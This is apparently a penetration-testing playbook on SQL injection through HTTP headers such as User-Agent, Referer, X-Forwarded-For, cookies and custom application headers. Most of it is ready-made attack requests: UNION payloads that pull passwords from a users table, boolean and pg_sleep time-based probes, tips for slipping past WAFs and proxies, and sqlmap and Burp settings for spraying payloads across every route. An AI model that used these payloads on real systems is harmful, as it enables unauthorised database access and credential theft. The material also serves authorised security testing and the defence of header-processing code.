# SQL Injection in HTTP Headers

## When this applies

- Application stores or queries the database based on header values that the user controls.
- Common with: analytics (User-Agent stored), access control (X-Forwarded-For, Referer), logging tables, language/country tracking (`Accept-Language`).
- Standard URL/body parameters are well-protected, but header processing is overlooked.

## Technique

Headers are a frequently-forgotten injection surface. Many apps log the User-Agent or X-Forwarded-For directly into a database table for analytics — and that INSERT may use string concatenation. Even GET to a static endpoint can be vulnerable if the analytics middleware is.

## Steps

### 1. Spray injection markers across all custom headers

```http
GET /page HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0' OR 1=1--
Referer: https://evil.com/' OR '1'='1
X-Forwarded-For: 127.0.0.1' UNION SELECT password FROM users--
X-Real-IP: 127.0.0.1') OR ('1'='1
Accept-Language: en'-- 
X-Original-URL: /admin
```

Watch for: 500 errors, response time changes (time-based), reflected error messages.

### 2. User-Agent injection (most common)

```http
GET / HTTP/1.1
Host: target.com
User-Agent: ' UNION SELECT null,null,version()--
```

Often paired with admin dashboards that show "recent visitors" — second-order trigger.

### 3. Referer injection

```http
GET /page HTTP/1.1
Host: target.com
Referer: https://evil.com/' OR '1'='1
```

Common in marketing/attribution tables.

### 4. X-Forwarded-For injection

```http
GET /page HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1' UNION SELECT password FROM users--
```

Frequently logged for security/audit purposes — and frequently concatenated into the log INSERT query.

### 5. Cookie value injection

Same primitives apply to cookies:

```http
Cookie: TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
Cookie: session=abc; lang=en' UNION SELECT @@version--
```

### 6. Custom application headers

Look at JS source for `fetch(...)` / `axios` calls to identify custom headers the app sends. Headers like `X-Tenant-ID`, `X-Org-Id`, `X-User-Role`, `X-API-Version` often go straight into a query.

### 7. Confirm with time-based payload

If output isn't visible, use timing on the header:

```http
User-Agent: Mozilla'+(SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END)+'
```

## Verifying success

- Response time spikes confirm time-based injection inside header processing.
- 500 / database error pages confirm the header value reaches a SQL string-concat path.
- Admin/analytics dashboard renders the leaked value (when accessible).
- Burp Collaborator interaction (for OAST) confirms async processing of headers.

## Common pitfalls

- WAFs scan headers, but rules are often relaxed (signatures focused on URL/body).
- `User-Agent` and similar headers often pass through proxies that normalize quotes — test directly against origin if possible.
- Some apps split `X-Forwarded-For` on `,` and use only the first or last entry — pad payload accordingly.
- Header injection may only trigger on specific endpoints (e.g. `/api/log`, `/track`, `/analytics`) — sweep with the same payload across all routes.
- Some logs are write-only — boolean/timing oracles may be your only feedback channel.

## Tools

- Burp Suite Match-and-Replace to set malicious headers across all requests.
- sqlmap `--headers="User-Agent: *"` (mark `*` as injection point).
- Custom Python with `requests.get(url, headers={...})` to test exhaustively.
